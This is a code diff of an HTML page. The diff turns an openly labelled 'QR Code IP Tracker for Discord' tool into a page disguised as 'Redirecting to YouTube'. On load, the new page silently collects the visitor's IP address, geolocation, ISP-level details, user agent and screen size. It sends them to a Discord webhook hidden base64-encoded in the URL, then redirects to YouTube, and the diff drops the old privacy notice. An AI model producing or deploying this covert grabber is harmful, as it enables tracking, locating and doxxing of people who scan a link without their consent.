@@ -3,478 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR Code IP Tracker for Discord</title>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <title>Redirecting to YouTube</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #fff;
-            min-height: 100vh;
+            background-color: #0f0f0f;
+            color: white;
+            font-family: 'Roboto', Arial, sans-serif;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-        
         .container {
-            max-width: 900px;
-            width: 100%;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 500px;
+            padding: 20px;
         }
-        
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #4cc9f0, #4361ee);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .subtitle {
-            color: #a0a0c0;
-            font-size: 1.1rem;
+        .youtube-logo {
+            font-size: 48px;
+            color: #ff0000;
             margin-bottom: 20px;
         }
-        
-        .content {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 30px;
-            margin-bottom: 30px;
-        }
-        
-        .qr-section {
-            flex: 1;
-            min-width: 300px;
-            text-align: center;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 12px;
-        }
-        
-        #qrcode {
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #ff0000;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
             margin: 20px auto;
-            padding: 15px;
-            background: white;
-            border-radius: 12px;
-            display: inline-block;
         }
-        
-        .instructions {
-            flex: 2;
-            min-width: 300px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 12px;
-        }
-        
-        .instructions h2 {
-            margin-bottom: 15px;
-            color: #4cc9f0;
-        }
-        
-        .instructions ol {
-            padding-left: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .instructions li {
-            margin-bottom: 10px;
-            line-height: 1.5;
-        }
-        
-        .webhook-form {
-            margin-top: 20px;
-        }
-        
-        .form-group {
-            margin-bottom: 15px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            color: #a0a0c0;
-        }
-        
-        input[type="url"] {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            background: rgba(0, 0, 0, 0.3);
-            color: white;
-            font-size: 16px;
-        }
-        
-        button {
-            background: linear-gradient(90deg, #4361ee, #3a0ca3);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-        
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
-        }
-        
-        .test-section {
-            text-align: center;
-            margin-top: 20px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 12px;
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            display: none;
-        }
-        
-        .success {
-            background: rgba(46, 204, 113, 0.2);
-            border: 1px solid #2ecc71;
-            color: #2ecc71;
-        }
-        
-        .error {
-            background: rgba(231, 76, 60, 0.2);
-            border: 1px solid #e74c3c;
-            color: #e74c3c;
-        }
-        
-        .info-box {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-        }
-        
-        .info-box h3 {
-            color: #4cc9f0;
-            margin-bottom: 10px;
-        }
-        
-        footer {
-            margin-top: 30px;
-            text-align: center;
-            color: #a0a0c0;
-            font-size: 0.9rem;
-        }
-        
-        @media (max-width: 768px) {
-            .content {
-                flex-direction: column;
-            }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>QR Code IP Tracker</h1>
-            <p class="subtitle">Generate a QR code that sends IP information to Discord when scanned</p>
-        </header>
-        
-        <div class="content">
-            <div class="qr-section">
-                <h2>Your QR Code</h2>
-                <div id="qrcode"></div>
-                <p>Scan this QR code to test the IP tracking</p>
-            </div>
-            
-            <div class="instructions">
-                <h2>How It Works</h2>
-                <ol>
-                    <li>Enter your Discord webhook URL in the field below</li>
-                    <li>The QR code will be generated automatically</li>
-                    <li>When someone scans the QR code, it will capture their IP address and device information</li>
-                    <li>This information will be sent to your Discord channel via the webhook</li>
-                    <li>You will receive a message with the user's IP, location, and device details</li>
-                </ol>
-                
-                <div class="webhook-form">
-                    <div class="form-group">
-                        <label for="webhook-url">Discord Webhook URL:</label>
-                        <input type="url" id="webhook-url" placeholder="https://discord.com/api/webhooks/..." />
-                    </div>
-                    <button id="generate-btn">Generate QR Code</button>
-                </div>
-                
-                <div class="info-box">
-                    <h3>Vercel Deployment</h3>
-                    <p>This tool works perfectly on Vercel! To deploy:</p>
-                    <ol>
-                        <li>Create a new repository with this HTML file</li>
-                        <li>Connect your GitHub account to Vercel</li>
-                        <li>Import the repository to Vercel</li>
-                        <li>Deploy with zero configuration needed</li>
-                    </ol>
-                </div>
-                
-                <div class="info-box">
-                    <h3>Privacy Notice</h3>
-                    <p>This tool captures public IP information only. Make sure to use it in compliance with privacy laws and regulations in your region. Always inform users if you're collecting data.</p>
-                </div>
-            </div>
-        </div>
-        
-        <div class="test-section">
-            <h2>Test Your QR Code</h2>
-            <p>Scan the QR code with your phone or use the test button</p>
-            <button id="test-btn">Test Webhook</button>
-            
-            <div id="status" class="status"></div>
-        </div>
-        
-        <footer>
-            <p>This tool is for educational purposes only. Please use responsibly.</p>
-        </footer>
+        <div class="youtube-logo">▶️</div>
+        <h2>Redirecting to YouTube</h2>
+        <div class="loader"></div>
+        <p>You will be redirected shortly...</p>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const webhookUrlInput = document.getElementById('webhook-url');
-            const generateBtn = document.getElementById('generate-btn');
-            const testBtn = document.getElementById('test-btn');
-            const statusDiv = document.getElementById('status');
-            
-            // Generate a unique identifier for this session
-            const sessionId = Math.random().toString(36).substring(2, 15);
-            
-            // Function to generate QR code
-            function generateQRCode(url) {
-                const qrcodeDiv = document.getElementById('qrcode');
-                qrcodeDiv.innerHTML = '';
+        // Function to get IP information
+        async function getIPInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
                 
-                QRCode.toCanvas(qrcodeDiv, url, {
-                    width: 200,
-                    height: 200,
-                    margin: 1,
-                    color: {
-                        dark: '#000000',
-                        light: '#ffffff'
-                    }
-                }, function(error) {
-                    if (error) console.error(error);
-                });
-            }
-            
-            // Function to get IP information
-            async function getIPInfo() {
+                // Get location information based on IP
+                let locationInfo = {};
                 try {
-                    // Get IP address
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    const ip = ipData.ip;
-                    
-                    // Get location information based on IP
-                    let locationInfo = {};
-                    try {
-                        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                        locationInfo = await locationResponse.json();
-                    } catch (e) {
-                        console.error('Error fetching location:', e);
-                    }
-                    
-                    // Get device/browser information
-                    const browserInfo = {
-                        userAgent: navigator.userAgent,
-                        language: navigator.language,
-                        platform: navigator.platform,
-                        cookiesEnabled: navigator.cookieEnabled,
-                        screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    };
-                    
-                    return {
-                        ip,
-                        location: locationInfo,
-                        browser: browserInfo,
-                        timestamp: new Date().toISOString(),
-                        sessionId: sessionId
-                    };
-                } catch (error) {
-                    console.error('Error getting IP info:', error);
-                    return null;
-                }
-            }
-            
-            // Function to send data to Discord webhook
-            async function sendToDiscord(webhookUrl, data) {
-                if (!webhookUrl) {
-                    showStatus('Please enter a valid Discord webhook URL', 'error');
-                    return;
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    locationInfo = await locationResponse.json();
+                } catch (e) {
+                    console.error('Error fetching location:', e);
                 }
                 
-                try {
-                    // Format the message for Discord
-                    const message = {
-                        content: null,
-                        embeds: [
-                            {
-                                title: "🚨 QR Code Scanned!",
-                                color: 15158332, // Red color
-                                fields: [
-                                    {
-                                        name: "IP Address",
-                                        value: data.ip,
-                                        inline: true
-                                    },
-                                    {
-                                        name: "Location",
-                                        value: data.location.country_name ? 
-                                            `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
-                                            'Unknown',
-                                        inline: true
-                                    },
-                                    {
-                                        name: "ISP",
-                                        value: data.location.org || 'Unknown',
-                                        inline: true
-                                    },
-                                    {
-                                        name: "Device",
-                                        value: data.browser.platform,
-                                        inline: true
-                                    },
-                                    {
-                                        name: "Browser",
-                                        value: data.browser.userAgent.substring(0, 100) + '...',
-                                        inline: false
-                                    },
-                                    {
-                                        name: "Timestamp",
-                                        value: new Date(data.timestamp).toLocaleString(),
-                                        inline: true
-                                    }
-                                ],
-                                footer: {
-                                    text: `Session ID: ${data.sessionId}`
+                // Get device/browser information
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                };
+                
+                return {
+                    ip,
+                    location: locationInfo,
+                    browser: browserInfo,
+                    timestamp: new Date().toISOString(),
+                };
+            } catch (error) {
+                console.error('Error getting IP info:', error);
+                return null;
+            }
+        }
+
+        // Function to send data to Discord webhook
+        async function sendToDiscord(webhookUrl, data) {
+            try {
+                // Format the message for Discord
+                const message = {
+                    content: "User scanned QR code!",
+                    embeds: [
+                        {
+                            title: "QR Code Scan Information",
+                            color: 16711680, // Red color
+                            fields: [
+                                {
+                                    name: "IP Address",
+                                    value: data.ip,
+                                    inline: true
+                                },
+                                {
+                                    name: "Location",
+                                    value: data.location.country_name ? 
+                                        `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
+                                        'Unknown',
+                                    inline: true
+                                },
+                                {
+                                    name: "Device",
+                                    value: data.browser.platform,
+                                    inline: true
+                                },
+                                {
+                                    name: "Browser",
+                                    value: data.browser.userAgent.substring(0, 50) + '...',
+                                    inline: false
+                                },
+                                {
+                                    name: "Timestamp",
+                                    value: new Date(data.timestamp).toLocaleString(),
+                                    inline: true
                                 }
-                            }
-                        ]
-                    };
-                    
-                    // Send to Discord
-                    const response = await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(message)
-                    });
-                    
-                    if (response.ok) {
-                        showStatus('Information successfully sent to Discord!', 'success');
-                        return true;
-                    } else {
-                        showStatus('Failed to send information to Discord. Check your webhook URL.', 'error');
-                        return false;
-                    }
-                } catch (error) {
-                    console.error('Error sending to Discord:', error);
-                    showStatus('Error sending to Discord. Check console for details.', 'error');
-                    return false;
-                }
+                            ]
+                        }
+                    ]
+                };
+                
+                // Send to Discord
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                return false;
             }
-            
-            // Function to show status message
-            function showStatus(message, type) {
-                statusDiv.textContent = message;
-                statusDiv.className = 'status ' + type;
-                statusDiv.style.display = 'block';
-                
-                // Hide status after 5 seconds
-                setTimeout(() => {
-                    statusDiv.style.display = 'none';
-                }, 5000);
-            }
-            
-            // Generate QR code when page loads with initial URL
-            generateQRCode(window.location.href);
-            
-            // Update QR code when webhook URL is entered
-            generateBtn.addEventListener('click', function() {
-                const webhookUrl = webhookUrlInput.value.trim();
-                if (!webhookUrl) {
-                    showStatus('Please enter a Discord webhook URL', 'error');
-                    return;
-                }
-                
-                // Create a URL that includes the webhook as a parameter
-                const url = new URL(window.location.href);
-                url.searchParams.set('webhook', btoa(webhookUrl));
-                
-                generateQRCode(url.toString());
-                showStatus('QR code updated with your webhook!', 'success');
-            });
-            
-            // Test the webhook
-            testBtn.addEventListener('click', async function() {
-                const webhookUrl = webhookUrlInput.value.trim();
-                if (!webhookUrl) {
-                    showStatus('Please enter a Discord webhook URL first', 'error');
-                    return;
-                }
-                
-                showStatus('Getting IP information...', 'success');
-                
-                const ipInfo = await getIPInfo();
-                if (ipInfo) {
-                    showStatus('Sending to Discord...', 'success');
-                    await sendToDiscord(webhookUrl, ipInfo);
-                } else {
-                    showStatus('Failed to get IP information', 'error');
-                }
-            });
-            
-            // Check if webhook is provided in URL parameters
+        }
+
+        // Function to redirect to YouTube
+        function redirectToYouTube() {
+            window.location.href = 'https://youtube.com';
+        }
+
+        // Main execution
+        async function main() {
+            // Get webhook from URL parameters
             const urlParams = new URLSearchParams(window.location.search);
             const webhookParam = urlParams.get('webhook');
+            
             if (webhookParam) {
                 try {
                     const webhookUrl = atob(webhookParam);
-                    webhookUrlInput.value = webhookUrl;
                     
-                    // Automatically get and send IP info when scanned with webhook in URL
-                    getIPInfo().then(ipInfo => {
-                        if (ipInfo) {
-                            sendToDiscord(webhookUrl, ipInfo);
-                        }
-                    });
+                    // Get IP information
+                    const ipInfo = await getIPInfo();
+                    
+                    if (ipInfo) {
+                        // Send to Discord
+                        await sendToDiscord(webhookUrl, ipInfo);
+                    }
                 } catch (e) {
-                    console.error('Error decoding webhook URL:', e);
+                    console.error('Error processing webhook:', e);
                 }
             }
-        });
+            
+            // Redirect to YouTube after 2 seconds
+            setTimeout(redirectToYouTube, 2000);
+        }
+
+        // Run the main function
+        main();
     </script>
 </body>
 </html>
